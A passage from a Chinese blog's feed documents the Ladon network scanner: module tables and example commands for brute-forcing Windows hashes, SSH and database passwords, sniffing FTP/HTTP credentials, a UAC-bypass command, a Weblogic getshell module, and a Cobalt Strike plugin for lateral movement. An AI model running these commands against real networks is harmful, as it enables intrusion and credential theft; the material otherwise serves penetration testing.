WhatCMS</td></tr><tr><td>11</td><td>CiscoScan</td><td>思科扫描</td><td>HTTP、TCP</td><td>Ladon 192.168.1.1/24 CiscoScan</td></tr><tr><td>12</td><td>EnumMssql</td><td>MSSQL主机</td><td>MSSQL</td><td>Ladon EnumMssql</td></tr><tr><td>13</td><td>EnumShare</td><td>共享主机</td><td>SMB</td><td>Ladon EnumShare</td></tr><tr><td>14</td><td>LdapScan</td><td>LDAP主机/389端口/密码爆破</td><td>LDAP、TCP</td><td>Ladon 192.168.1.1/24 LdapScan</td></tr><tr><td>15</td><td>FtpScan</td><td>FTP主机/21端口/密码爆破</td><td>FTP、TCP</td><td>Ladon 192.168.1.1/24 FtpScan</td></tr><tr><td>16</td><td>SmbScan</td><td>445端口/密码爆破</td><td>SMB、TCP</td><td>Ladon 192.168.1.1/24 SmbScan</td></tr><tr><td>17</td><td>WmiScan</td><td>135端口/密码爆破</td><td>WMI、TCP</td><td>Ladon 192.168.1.1/24 WmiScan</td></tr><tr><td>18</td><td>SmbHash</td><td>445端口/密码爆破</td><td>SMB、TCP</td><td>Ladon 192.168.1.1/24 SmbHash</td></tr><tr><td>19</td><td>WmiHash</td><td>135端口/密码爆破</td><td>WMI、TCP</td><td>Ladon 192.168.1.1/24 WmiHash</td></tr><tr><td>20</td><td>SshScan</td><td>22端口/密码爆破</td><td>SSH、TCP</td><td>Ladon 192.168.1.1/24 SshScan</td></tr><tr><td>21</td><td>MssqlScan</td><td>1433端口/密码爆破</td><td>MSSQL、TCP</td><td>Ladon 192.168.1.1/24 MssqlScan</td></tr><tr><td>22</td><td>OracleScan</td><td>1521端口/密码爆破</td><td>Oracle、TCP</td><td>Ladon 192.168.1.1/24 OracleScan</td></tr><tr><td>23</td><td>MysqlScan</td><td>3306端口/密码爆破</td><td>MYSQL、TCP</td><td>Ladon 192.168.1.1/24 MysqlScan</td></tr><tr><td>24</td><td>VncScan</td><td>5900端口/密码爆破</td><td>VNC、TCP</td><td>Ladon 192.168.1.1/24 VncScan</td></tr><tr><td>25</td><td>MS17010</td><td>MS17010漏洞检测</td><td>TCP、SMB</td><td>Ladon 192.168.1.1/24 MS17010</td></tr><tr><td>26</td><td>AdiDnsDump</td><td>域内存活机器</td><td>DNS、LDAP</td><td>Ladon AdiDnsDump 域机器IP</td></tr><tr><td>27</td><td>FtpSniffer</td><td>Ftp密码嗅探</td><td>FTP</td><td>Ladon FtpSniffer 192.168.1.8</td></tr><tr><td>28</td><td>HttpSniffer</td><td>HTTP密码嗅探</td><td>HTTP</td><td>Ladon HTTPSniffer 192.168.1.8</td></tr></tbody></table><p>PS: Ladon 6.2开始密码爆破模块，在无帐密文件的情况下，仅探测协议或对应端口<br>当然所有密码爆破均可自定义端口爆破，但自定义端口可能只支持一台不支持批量<br>具体看Ladon对应模块的详细文档,嗅探模块嗅探出HTTP或FTP帐密同时也证明其存活</p><h3 id="Browser协议"><a href="#Browser协议" class="headerlink" title="Browser协议"></a>Browser协议</h3><p>无意发现browser协议中含有机器名、系统版本,发包时间随机，有些2-12分钟<br>除了上述方法外，Browser协议也可以用于探测存活主机，不过是基于嗅探<br>基于Browser协议探测内网主机，详见：<a href="http://k8gege.org/p/16b5ff0b.html">http://k8gege.org/p/16b5ff0b.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;img alt=&quot;image&quot; data-original=&quot;http://k8gege.org/k8img/Ladon/exe/OnlinePC6.2.png&quot;&gt;&lt;/p&gt;
&lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; titl
      
    
    </summary>
    
    
      <category term="Ladon" scheme="http://k8gege.org/categories/Ladon/"/>
    
    
      <category term="Ladon" scheme="http://k8gege.org/tags/Ladon/"/>
    
  </entry>
  
  <entry>
    <title>Ladon 6.2新增Ntlm Hash爆破每分钟可破4万个密码</title>
    <link href="http://k8gege.org/p/39070.html"/>
    <id>http://k8gege.org/p/39070.html</id>
    <published>2020-03-30T11:00:00.000Z</published>
    <updated>2020-04-21T12:21:59.304Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>天下武功,无坚不破,唯快不破。扫描速度 SMB &gt; Wmi ，但是SMB通不代表WMI通。<br>每秒700个左右，换句话说你只收集到500个密码，验证一个C段也就一分钟左右。</p><h3 id="Ladon6-2更新功能"><a href="#Ladon6-2更新功能" class="headerlink" title="Ladon6.2更新功能"></a>Ladon6.2更新功能</h3><p>ID | 模块名称 |  功能说明  | 返回结果<br>-|-|-|-|-<br>0 | <a href="https://github.com/k8gege/Ladon/wiki/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E5%AD%98%E6%B4%BB%E4%B8%BB%E6%9C%BA%E6%89%AB%E6%8F%8F" target="_blank" rel="noopener">OnlinePC</a> | 存活主机扫描 | 存活IP、Mac地址、机器名、设备制造商<br>1 | <a href="http://k8gege.org/p/39070.html">SmbHashScan</a>  |  SMB HASH密码爆破(Windows) | 检测过程、成功密码、LOG文件 |<br>2 | <a href="http://k8gege.org/p/39070.html">WmiHashScan</a>  |  WMI HASH密码爆破(Windows) | 检测过程、成功密码、LOG文件 |<br>3 | <a href="http://k8gege.org/p/39070.html">BypassUac</a>   | 绕过UAC执行,支持Win7-Win10 | Ladon BypassUac c:\1.exe<br>4 | <a href="http://k8gege.org/p/39070.html">EnableDotNet</a>   | 一键启用.net 3.5(2008系统默认未启用) | Ladon EnableDotNet<br>5 | <a href="http://k8gege.org/p/39070.html">gethtml</a>   | 获取内网站点HTML源码 | Ladon gethtml <a href="http://192.168.1.1" target="_blank" rel="noopener">http://192.168.1.1</a><br>6 | <a href="http://k8gege.org/p/39070.html">AdiDnsDump</a>  | 域内机器信息获取(非域内请使用LdapScan探测) | IP、域名<br>7 | <a href="http://k8gege.org/p/39070.html">LdapScan</a>  | 不指定密码时，仅探测LDAP服务器 | IP是否LDAP服务器<br>8 | <a href="http://k8gege.org/p/39070.html">FtpScan</a>  | 不指定密码时，仅探测FTP服务器 | IP是否FTP服务器<br>9| <a href="http://k8gege.org/p/c5430395.html">Ladon.cna</a> | CobaltStrike 3.x-4.0右键菜单 | 一键扫描内网<br>10 命令支持CIDR格式IP扫描<br>11 INI配置支持自定义密码爆破<br>12 PortScan命令行支持自定义端口</p><h3 id="BUG修复"><a href="#BUG修复" class="headerlink" title="BUG修复"></a>BUG修复</h3><p>修复SmbScan遇到%非数字密码停止的BUG<br>修复一些模块扫描TXT列表崩溃的BUG<br>修复LdapScan扫描check.txt只检测一个的bug</p><h3 id="SmbHash密码爆破"><a href="#SmbHash密码爆破" class="headerlink" title="SmbHash密码爆破"></a>SmbHash密码爆破</h3><p><img alt data-original="http://k8gege.org/k8img/Ladon/exe/smbhash.PNG"></p><h3 id="WmiHash密码爆破"><a href="#WmiHash密码爆破" class="headerlink" title="WmiHash密码爆破"></a>WmiHash密码爆破</h3><p><img alt data-original="http://k8gege.org/k8img/Ladon/exe/WmiHash.PNG"></p><h3 id="LDAP服务器识别"><a href="#LDAP服务器识别" class="headerlink" title="LDAP服务器识别"></a>LDAP服务器识别</h3><p>目录下无帐密或相关文件时，使用LDAP协议探测服务器。<br><img alt data-original="http://k8gege.org/k8img/Ladon/exe/LdapScan0.PNG"></p><h3 id="Ftp服务器识别"><a href="#Ftp服务器识别" class="headerlink" title="Ftp服务器识别"></a>Ftp服务器识别</h3><p>目录下无帐密或相关文件时，使用FTP协议探测服务器。<br><img alt data-original="http://k8gege.org/k8img/Ladon/exe/FtpScan0.PNG"></p><h3 id="自定义密码爆破"><a href="#自定义密码爆破" class="headerlink" title="自定义密码爆破"></a>自定义密码爆破</h3><p>详见：<a href="http://k8gege.org/p/53177.html">http://k8gege.org/p/53177.html</a><br><img alt data-original="http://k8gege.org/k8img/Ladon/exe/DiyIniPwd.PNG"></p><h3 id="OnlinePC存活主机"><a href="#OnlinePC存活主机" class="headerlink" title="OnlinePC存活主机"></a>OnlinePC存活主机</h3><p><img alt="image" data-original="http://k8gege.org/k8img/Ladon/exe/OnlinePC6.2.png"></p><h3 id="PortScan端口扫描"><a href="#PortScan端口扫描" class="headerlink" title="PortScan端口扫描"></a>PortScan端口扫描</h3><p>命令行支持自定义端口，而不是非要ports.txt指定端口<br>Ladon 192.168.1.8-192.168.1.200 PortScan 22,80,1433,21,3306,1521<br><img alt="image" data-original="http://k8gege.org/k8img/Ladon/exe/PortScan6.2.PNG"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;天下武功,无坚不破,唯快不破。扫描速度 SMB &amp;gt; Wmi ，但是SMB通不代表WMI通。&lt;br&gt;每秒700个左右，换句话说你只收集到
      
    
    </summary>
    
    
      <category term="Kali" scheme="http://k8gege.org/categories/Kali/"/>
    
      <category term="密码" scheme="http://k8gege.org/categories/Pass/"/>
    
      <category term="Ladon" scheme="http://k8gege.org/categories/Ladon/"/>
    
    
      <category term="Ladon" scheme="http://k8gege.org/tags/Ladon/"/>
    
      <category term="Tool" scheme="http://k8gege.org/tags/Tool/"/>
    
      <category term="Kali" scheme="http://k8gege.org/tags/Kali/"/>
    
      <category term="Scanner" scheme="http://k8gege.org/tags/Scanner/"/>
    
  </entry>
  
  <entry>
    <title>Ladon for MacOS</title>
    <link href="http://k8gege.org/p/60379.html"/>
    <id>http://k8gege.org/p/60379.html</id>
    <published>2020-03-30T04:50:00.000Z</published>
    <updated>2020-03-30T04:51:02.558Z</updated>
    
    <content type="html"><![CDATA[<p><img alt="Ladon" data-original="http://k8gege.org/k8img/Ladon/Dragon.jpg"></p><p><a href="https://github.com/k8gege" target="_blank" rel="noopener"><img alt="Author" data-original="https://img.shields.io/badge/Author-k8gege-blueviolet"></a> <a href="https://github.com/k8gege/Ladon" target="_blank" rel="noopener"><img alt="Ladon" data-original="https://img.shields.io/badge/Ladon-5.8-yellowgreen"></a> <a href="https://github.com/k8gege/Ladon/releases" target="_blank" rel="noopener"><img alt="Bin" data-original="https://img.shields.io/badge/Ladon-Bin-ff69b4"></a> <a href="https://github.com/k8gege/Ladon/issues" target="_blank" rel="noopener"><img alt="GitHub issues" data-original="https://img.shields.io/github/issues/k8gege/Ladon"></a> <a href="https://github.com/k8gege/Ladon" target="_blank" rel="noopener"><img alt="Github Stars" data-original="https://img.shields.io/github/stars/k8gege/Ladon"></a> <a href="https://github.com/k8gege/Ladon" target="_blank" rel="noopener"><img alt="GitHub forks" data-original="https://img.shields.io/github/forks/k8gege/Ladon"></a><a href="https://github.com/k8gege/Ladon" target="_blank" rel="noopener"><img alt="GitHub license" data-original="https://img.shields.io/github/license/k8gege/Ladon"></a></p><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>在尘封已久的笔记本上安装mono后测试Ladon，确实支持苹果系统。当初没环境一直没测，和大家说理论上支持，现已证实。</p><p>测试环境：<br>Mac 10.15.3<br>mono 6.6.0.166<br>一不小心装的都是最新版，大家也可以在现有版本上测试，应该都是支持的。<br>使用方法和kali下使用一样，下载KaliLadon将其改名Ladon，在执行Ladon时在前面加上mono即可</p><h3 id="程序简介"><a href="#程序简介" class="headerlink" title="程序简介"></a>程序简介</h3><p>Ladon一款用于大型网络渗透的多线程插件化综合扫描神器，含端口扫描、服务识别、网络资产、密码爆破、高危漏洞检测以及一键GetShell，支持批量A段/B段/C段以及跨网段扫描，支持URL、主机、域名列表扫描。5.7版本内置40个功能模块,通过多种协议以及方法快速获取目标网络存活主机IP、计算机名、工作组、共享资源、网卡地址、操作系统版本、网站、子域名、中间件、开放服务、路由器、数据库等信息，漏洞检测包含MS17010、Weblogic、ActiveMQ、Tomcat、Struts2等，密码爆破11种含数据库(Mysql、Oracle、MSSQL)、FTP、SSH(Linux主机)、VNC、Windows密码(IPC、WMI、SMB)、Weblogic后台、Rar压缩包密码等，Web指纹识别模块可识别75种（Web应用、中间件、脚本类型、页面类型）等，可高度自定义插件POC支持.NET程序集、DLL(C#/Delphi/VC)、PowerShell等语言编写的插件,支持通过配置INI批量调用任意外部程序或命令，EXP生成器可一键生成漏洞POC快速扩展扫描能力。Ladon支持Cobalt Strike插件化扫描快速拓展内网进行横向移动。<br></p><h3 id="使用简单"><a href="#使用简单" class="headerlink" title="使用简单"></a>使用简单</h3><p>虽然Ladon功能丰富多样,但使用却非常简单,任何人都能轻易上手<br>只需一或两个参数就可用90%的功能,一个模块相当于一个新工具</p><h3 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h3><p>Mac 10.15.3<br>mono 6.6.0.166</p><h3 id="安装mono"><a href="#安装mono" class="headerlink" title="安装mono"></a>安装mono</h3><p>linux下需mono运行环境，Kali和Ubuntu安装命令通用。<br>其它系统未进行测试，喜欢用其它Linux系统自行测试。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install mono-runtime</span><br></pre></td></tr></table></figure><h3 id="运行Ladon"><a href="#运行Ladon" class="headerlink" title="运行Ladon"></a>运行Ladon</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mono Ladon OnlinePC</span><br></pre></td></tr></table></figure><h3 id="可用功能"><a href="#可用功能" class="headerlink" title="可用功能"></a>可用功能</h3><p>由于mono的兼容性问题，不保证苹果下所有功能均可用<br>就对于Ladon功能的测试来看Kali的兼容性要比Ubuntu好<br>测试发现有些功能的稳定性以及速度没有Windows系统快<br>未列功能系未测试或暂不可用功能，使用前请先看说明<br>在Kali 2019.4下测试，Ladon支持以下所列的27种功能<br>=============================================</p><table><thead><tr><th>ID</th><th>模块</th><th>说明</th></tr></thead><tbody><tr><td>1</td><td>WebDir</td><td>Web目录扫描</td></tr><tr><td>2</td><td>UrlScan</td><td>URL域名扫描（不验IP）</td></tr><tr><td>3</td><td>PhpStudyPoc</td><td>PhpStudy后门扫描</td></tr><tr><td>4</td><td>WebScan</td><td>Web信息扫描</td></tr><tr><td>5</td><td>MysqlScan</td><td>Mysql口令检测</td></tr><tr><td>6</td><td>OracleScan</td><td>Oracle口令检测</td></tr><tr><td>7</td><td>VncScan</td><td>Vnc口令检测</td></tr><tr><td>8</td><td>HttpDownLoad</td><td>Http下载</td></tr><tr><td>9</td><td>FtpDownLoad</td><td>Ftp下载</td></tr><tr><td>10</td><td>WhatCMS</td><td>75种CMS识别</td></tr><tr><td>11</td><td>FtpScan</td><td>Ftp口令检测</td></tr><tr><td>12</td><td>PortScan</td><td>PortScan端口扫描</td></tr><tr><td>13</td><td>SmbScan</td><td>Smb口令检测</td></tr><tr><td>14</td><td>SameWeb</td><td>站点域名扫描（验证IP）</td></tr><tr><td>15</td><td>MS17010</td><td>MS17010漏洞扫描</td></tr><tr><td>16</td><td>OnlinePC</td><td>存活主机扫描</td></tr><tr><td>17</td><td>OnlineIP</td><td>存活主机IP扫描</td></tr><tr><td>18</td><td>HostIP</td><td>主机名解析IP</td></tr><tr><td>19</td><td>DomainIP</td><td>子域名解析IP</td></tr><tr><td>20</td><td>EnBase64</td><td>批量Base64密码加密</td></tr><tr><td>21</td><td>DeBase64</td><td>批量Base64密码解密</td></tr><tr><td>22</td><td>EnHex</td><td>批量Hex密码加密</td></tr><tr><td>23</td><td>DeHex</td><td>批量Hex密码解密</td></tr><tr><td>24</td><td>OsScan</td><td>系统版本探测</td></tr><tr><td>25</td><td>SubDomain</td><td>子域名爆破</td></tr><tr><td>26</td><td>SshScan</td><td>SSH口令检测</td></tr><tr><td>27</td><td>*.ps1</td><td>无PowerShell执行脚本</td></tr></tbody></table><h3 id="暂不支持功能"><a href="#暂不支持功能" class="headerlink" title="暂不支持功能"></a>暂不支持功能</h3><p>=============================================<br>Struts2Poc  X不支持<br>TomcatScan X不支持<br>HttpBasicScan X不支持，只能检测是否401认证URL，无法爆破<br>WeblogicPoc X 竟然不支持(Win下mono也不支持，显然mono问题)<br>MssqlScan X不支持只能扫到开放端口<br>IpcScan X不支持(因为调用cmd命令)</p><h3 id="MacOS功能实测"><a href="#MacOS功能实测" class="headerlink" title="MacOS功能实测"></a>MacOS功能实测</h3><p>由于环境少原因，仅测了以下功能，其它模块请自行测试。<br>可用功能应该和在Kali下可使用差不多，如不可用可反馈。</p><h4 id="MS17010漏洞扫描"><a href="#MS17010漏洞扫描" class="headerlink" title="MS17010漏洞扫描"></a>MS17010漏洞扫描</h4><p><img alt data-original="http://k8gege.org/k8img/Ladon/mac/mac_ms17010.jpg"></p><h4 id="OsScan系统探测"><a href="#OsScan系统探测" class="headerlink" title="OsScan系统探测"></a>OsScan系统探测</h4><p><img alt data-original="http://k8gege.org/k8img/Ladon/mac/mac_osscan.jpg"></p><h4 id="UrlScan、Base64加解密"><a href="#UrlScan、Base64加解密" class="headerlink" title="UrlScan、Base64加解密"></a>UrlScan、Base64加解密</h4><p><img alt data-original="http://k8gege.org/k8img/Ladon/mac/mac_UrlScan.jpg"></p><h4 id="webScan-SameWeb网站信息扫描"><a href="#webScan-SameWeb网站信息扫描" class="headerlink" title="webScan/SameWeb网站信息扫描"></a>webScan/SameWeb网站信息扫描</h4><p><img alt data-original="http://k8gege.org/k8img/Ladon/mac/mac_sameWeb.jpg"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;img alt=&quot;Ladon&quot; data-original=&quot;http://k8gege.org/k8img/Ladon/Dragon.jpg&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/k8gege&quot; target=&quot;_blank&quot; rel
      
    
    </summary>
    
    
      <category term="工具" scheme="http://k8gege.org/categories/Tool/"/>
    
      <category term="Kali" scheme="http://k8gege.org/categories/Kali/"/>
    
      <category term="Ladon" scheme="http://k8gege.org/categories/Ladon/"/>
    
    
      <category term="Ladon" scheme="http://k8gege.org/tags/Ladon/"/>
    
      <category term="Tool" scheme="http://k8gege.org/tags/Tool/"/>
    
      <category term="Kali" scheme="http://k8gege.org/tags/Kali/"/>
    
      <category term="Scanner" scheme="http://k8gege.org/tags/Scanner/"/>
    
  </entry>
  
  <entry>
    <title>Ladon For Cobalt Strike 4.0</title>
    <link href="http://k8gege.org/p/c5430395.html"/>
    <id>http://k8gege.org/p/c5430395.html</id>
    <published>2020-03-29T16:11:00.000Z</published>
    <updated>2020-03-30T12:08:04.579Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>Ladon 6.2支持Cobalt Strike 4.0,内置58个功能<br>加载脚本Ladon.cna,通过Beacon命令或右键使用</p><h3 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h3><p>CS命令行下扫描目标内网,无需代理转发扫描收集信息、密码爆破等<br>跳板扫描外网资产(即无需代理直接通过在控机器扫描其它目标资产)</p><h3 id="Ladon右键菜单"><a href="#Ladon右键菜单" class="headerlink" title="Ladon右键菜单"></a>Ladon右键菜单</h3><p>相比Beacon命令行，GUI就更简单了，只需填写IP、URL等，一键扫描</p><p>主菜单<br><img alt data-original="http://k8gege.org/k8img/Ladon/cs/CS4_Ladon.PNG"><br>资产扫描<br><img alt data-original="http://k8gege.org/k8img/Ladon/cs/CS4_LadonDiscover.PNG"><br>漏洞检测<br><img alt data-original="http://k8gege.org/k8img/Ladon/cs/CS4_LadonVulScan.PNG"><br>密码爆破<br><img alt data-original="http://k8gege.org/k8img/Ladon/cs/CS4_LadonBrute.PNG"><br>网络嗅探<br><img alt data-original="http://k8gege.org/k8img/Ladon/cs/CS4_LadonSinfiier.PNG"><br>信息收集<br><img alt data-original="http://k8gege.org/k8img/Ladon/cs/CS4_LadonGetinfo.PNG"></p><p>例子：WmiHash密码爆破<br><img alt data-original="http://k8gege.org/k8img/Ladon/exe/WmiHash.PNG"></p><h3 id="Beacon命令帮助"><a href="#Beacon命令帮助" class="headerlink" title="Beacon命令帮助"></a>Beacon命令帮助</h3><p>Example: Ladon help</p><p><img alt data-original="http://k8gege.org/k8img/Ladon/CS_Ladon.gif"></p><h3 id="1-MS17010-MS17-010漏洞扫描"><a href="#1-MS17010-MS17-010漏洞扫描" class="headerlink" title="1.MS17010 MS17-010漏洞扫描"></a>1.MS17010 MS17-010漏洞扫描</h3><p>Example: Ladon 192.168.1.8/24 MS17010<br>结果:IP、SMB漏洞、机器名、操作系统版本<br><img alt="MS17010" data-original="http://k8gege.org/k8img/Ladon/cs/CS_MS17010.gif"></p><h3 id="2-OSscan-操作系统探测"><a href="#2-OSscan-操作系统探测" class="headerlink" title="2.OSscan 操作系统探测"></a>2.OSscan 操作系统探测</h3><p>Example: Ladon 192.168.1.8/24 OSscan<br>通过SMB、多端口、Banner等方式探测（存活主机、主机名、域名、操作系统版本、开放服务等）<br><img alt="OSscan" data-original="http://k8gege.org/k8img/Ladon/cs/CS_OSscan.gif"></p><h3 id="3-OnlinePC-存活主机扫描"><a href="#3-OnlinePC-存活主机扫描" class="headerlink" title="3.OnlinePC 存活主机扫描"></a>3.OnlinePC 存活主机扫描</h3><p>Example: Ladon 192.168.1.8/24 OnlinePC<br>也支持检测主机名/域名是否存活,结果IP、Mac、机器名<br><img alt="OnlinePC" data-original="http://k8gege.org/k8img/Ladon/cs/CS_OnlinePC.gif"></p><h3 id="4-WebScan-Web扫描"><a href="#4-WebScan-Web扫描" class="headerlink" title="4.WebScan Web扫描"></a>4.WebScan Web扫描</h3><p>Example: Ladon 192.168.1.8/24 WebScan<br>内网站点扫描，获取服务器Banner、网页标题<br><img alt="WebScan" data-original="http://k8gege.org/k8img/Ladon/cs/CS_WebScan.gif"></p><h3 id="5-FtpScan-FTP密码扫描"><a href="#5-FtpScan-FTP密码扫描" class="headerlink" title="5.FtpScan FTP密码扫描"></a>5.FtpScan FTP密码扫描</h3><p>Example: Ladon 192.168.1.8/24 FtpScan<br>需上传user.txt和pass.txt至beacon工作目录<br><img alt="FtpScan" data-original="http://k8gege.org/k8img/Ladon/cs/CS_FtpScan.gif"></p><h3 id="6-WmiScan-Win方式爆破Windows密码（IPC被拒绝时可尝试WMI）"><a href="#6-WmiScan-Win方式爆破Windows密码（IPC被拒绝时可尝试WMI）" class="headerlink" title="6.WmiScan Win方式爆破Windows密码（IPC被拒绝时可尝试WMI）"></a>6.WmiScan Win方式爆破Windows密码（IPC被拒绝时可尝试WMI）</h3><p>Example: Ladon 192.168.1.8/24 WmiScan<br>Wmi方式批量爆破内网主机帐密,需上传user.txt和pass.txt至工作目录<br><img alt="WmiScan" data-original="http://k8gege.org/k8img/Ladon/cs/CS_WmiScan.gif"></p><h3 id="7-CiscoScan-思科设备扫描"><a href="#7-CiscoScan-思科设备扫描" class="headerlink" title="7.CiscoScan 思科设备扫描"></a>7.CiscoScan 思科设备扫描</h3><p>Example: Ladon 192.168.1.8/24 CiscoScan<br>(IP、设备型号、主机名、Boot、硬件版本)<br><img alt="CiscoScan" data-original="http://k8gege.org/k8img/Ladon/cs/CS_CiscoScan.gif"></p><h3 id="8-UrlScan-C段域名URL扫描"><a href="#8-UrlScan-C段域名URL扫描" class="headerlink" title="8.UrlScan C段域名URL扫描"></a>8.UrlScan C段域名URL扫描</h3><p>Example: Ladon 192.168.1.8/24 UrlScan<br>通过源码获取域名或URL，但不验证IP,适用于内网扫描时，目标域名指向外网IP<br>或者通过域名判断内网站点是何产品，比如出现cisco.com域名，说明此为cisco设备<br><img alt="UrlScan" data-original="http://k8gege.org/k8img/Ladon/cs/CS_UrlScan.gif"></p><h3 id="9-SameWeb-C段旁站扫描"><a href="#9-SameWeb-C段旁站扫描" class="headerlink" title="9.SameWeb C段旁站扫描"></a>9.SameWeb C段旁站扫描</h3><p>Example: Ladon 192.168.1.8/24 SameWeb<br>通过源码获取域名并验证IP，返回正确的同服站点,非bing或爱站等方式,即内网不可上网也可扫描<br>验证IP主要适用于，外网扫描时旁站，因为获取的域名指向外网时，无法通过IP判断是否属于同服<br><img alt="SameWeb" data-original="http://k8gege.org/k8img/Ladon/cs/CS_SameWeb.gif"></p><h3 id="10-WeblogicExp-amp-WeblogicPoc"><a href="#10-WeblogicExp-amp-WeblogicPoc" class="headerlink" title="10.WeblogicExp &amp; WeblogicPoc"></a>10.WeblogicExp &amp; WeblogicPoc</h3><p>Example: Ladon 192.168.1.8/24 WeblogicPoc<br>Example: Ladon 192.168.1.8/24 WeblogicExp<br>Weblogic漏洞扫描两个模块,一个是只扫描是否存在漏洞，另一个是扫描并且GetShell<br><img alt="WeblogicExp" data-original="http://k8gege.org/k8img/Ladon/cs/CS_WeblogicExp.gif"></p><h3 id="11-EnumMSSQL-枚举局域网MS-SQL-SERVER数据库主机"><a href="#11-EnumMSSQL-枚举局域网MS-SQL-SERVER数据库主机" class="headerlink" title="11.EnumMSSQL 枚举局域网MS SQL SERVER数据库主机"></a>11.EnumMSSQL 枚举局域网MS SQL SERVER数据库主机</h3><p>Example: Ladon 192.168.1.8/24 EnumMSSQL<br>和PowerUpSql一样不一定能获取到SQL版本<br><img alt data-original="http://k8gege.org/k8img/Ladon/cs/CS_EnumMSSQL.gif"></p><h3 id="12-EnumShare-枚举局域网共享资源"><a href="#12-EnumShare-枚举局域网共享资源" class="headerlink" title="12.EnumShare 枚举局域网共享资源"></a>12.EnumShare 枚举局域网共享资源</h3><p>Example: Ladon 192.168.1.8/24 EnumShare<br><img alt data-original="http://k8gege.org/k8img/Ladon/cs/CS_EnumShare.gif"></p><h3 id="13-MssqlScan-MSSQL数据库密码爆破"><a href="#13-MssqlScan-MSSQL数据库密码爆破" class="headerlink" title="13.MssqlScan MSSQL数据库密码爆破"></a>13.MssqlScan MSSQL数据库密码爆破</h3><p>Example: Ladon 192.168.1.8/24 MssqlScan<br><img alt data-original="http://k8gege.org/k8img/Ladon/cs/CS_MssqlScan.gif"></p><h3 id="14-MysqlScan-MySQL数据库密码爆破"><a href="#14-MysqlScan-MySQL数据库密码爆破" class="headerlink" title="14.MysqlScan MySQL数据库密码爆破"></a>14.MysqlScan MySQL数据库密码爆破</h3><p>Example: Ladon 192.168.1.8/24 MysqlScan<br><img alt data-original="http://k8gege.org/k8img/Ladon/cs/CS_MysqlScan.gif"></p><h3 id="15-SSHscan-SSH主机密码爆破"><a href="#15-SSHscan-SSH主机密码爆破" class="headerlink" title="15.SSHscan SSH主机密码爆破"></a>15.SSHscan SSH主机密码爆破</h3><p>Example: Ladon 192.168.1.8/24 SSHscan<br><img alt data-original="http://k8gege.org/k8img/Ladon/cs/CS_SSHscan.gif"></p><h3 id="16-OracleScan-Oracle数据库密码爆破"><a href="#16-OracleScan-Oracle数据库密码爆破" class="headerlink" title="16.OracleScan Oracle数据库密码爆破"></a>16.OracleScan Oracle数据库密码爆破</h3><p>Example: Ladon 192.168.1.8/24 OracleScan<br><img alt data-original="http://k8gege.org/k8img/Ladon/cs/CS_OracleScan.gif"></p><h3 id="17-HostIP-域名解析-主机名转IP"><a href="#17-HostIP-域名解析-主机名转IP" class="headerlink" title="17.HostIP 域名解析/主机名转IP"></a>17.HostIP 域名解析/主机名转IP</h3><p>Example: Ladon 192.168.1.8/24 HostIP<br><img alt data-original="http://k8gege.org/k8img/Ladon/cs/CS_HostIP.gif"></p><h3 id="18-WhatCMS-Web指纹识别支持75种"><a href="#18-WhatCMS-Web指纹识别支持75种" class="headerlink" title="18.WhatCMS Web指纹识别支持75种"></a>18.WhatCMS Web指纹识别支持75种</h3><p>Example: Ladon 192.168.1.8/24 WhatCMS<br>url.txt指定站点或批量站点扫描,也可扫描整个C段部分web端口对应CMS<br><img alt data-original="http://k8gege.org/k8img/Ladon/cs/CS_WhatCMS.gif"></p><h3 id="19-IpcScan-Windows密码爆破-Wmi被拒绝时可尝试Ipc"><a href="#19-IpcScan-Windows密码爆破-Wmi被拒绝时可尝试Ipc" class="headerlink" title="19.IpcScan Windows密码爆破(Wmi被拒绝时可尝试Ipc)"></a>19.IpcScan Windows密码爆破(Wmi被拒绝时可尝试Ipc)</h3><p>Example: Ladon 192.168.1.8/24 IpcScan<br><img alt data-original="http://k8gege.org/k8img/Ladon/cs/CS_IpcScan.gif"></p><h3 id="21-EnBase64-DeBase64-Base64密码批量加密解密"><a href="#21-EnBase64-DeBase64-Base64密码批量加密解密" class="headerlink" title="21.EnBase64/DeBase64  Base64密码批量加密解密"></a>21.EnBase64/DeBase64  Base64密码批量加密解密</h3><p>Example: Ladon 明文字符串 EnBase64<br>Example: Ladon Base64内容 DeBase64<br><img alt data-original="http://k8gege.org/k8img/Ladon/cs/CS_Base64.gif"></p><h3 id="22-EnHex-DeHex-Hex密码批量加密解密-3种格式"><a href="#22-EnHex-DeHex-Hex密码批量加密解密-3种格式" class="headerlink" title="22.EnHex/DeHex  Hex密码批量加密解密(3种格式)"></a>22.EnHex/DeHex  Hex密码批量加密解密(3种格式)</h3><p>Example: Ladon 明文字符串 EnHex<br>Example: Ladon 16进制内容 EnHex<br><img alt data-original="http://k8gege.org/k8img/Ladon/cs/CS_DeHex.gif"></p><h3 id="23-SmbScan-Windows密码爆破-Wmi被拒绝时可尝试-记录错误日志"><a href="#23-SmbScan-Windows密码爆破-Wmi被拒绝时可尝试-记录错误日志" class="headerlink" title="23.SmbScan Windows密码爆破(Wmi被拒绝时可尝试,记录错误日志)"></a>23.SmbScan Windows密码爆破(Wmi被拒绝时可尝试,记录错误日志)</h3><p>Example: Ladon 192.168.1.8/24 SmbScan<br><img alt data-original="http://k8gege.org/k8img/Ladon/cs/CS_SmbScan.gif"></p><h3 id="24-PhpStudyPoc-PhpStudy后门检测"><a 